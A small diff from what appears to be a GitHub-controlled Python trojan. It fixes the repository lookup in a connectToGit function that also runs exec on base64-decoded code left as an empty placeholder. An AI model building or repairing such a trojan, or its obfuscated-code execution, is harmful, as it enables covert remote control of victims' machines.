@@ -21,7 +21,7 @@ user = ""#your github account name
 
 def connectToGit():
 	exec(base64.b64decode(""))#put the base64 coding in ""
-	repo = gh.repository("user", "Trojan")
+	repo = gh.repository(user, "Trojan")
 	branch = repo.branch("master")
 	return gh, repo, branch
 
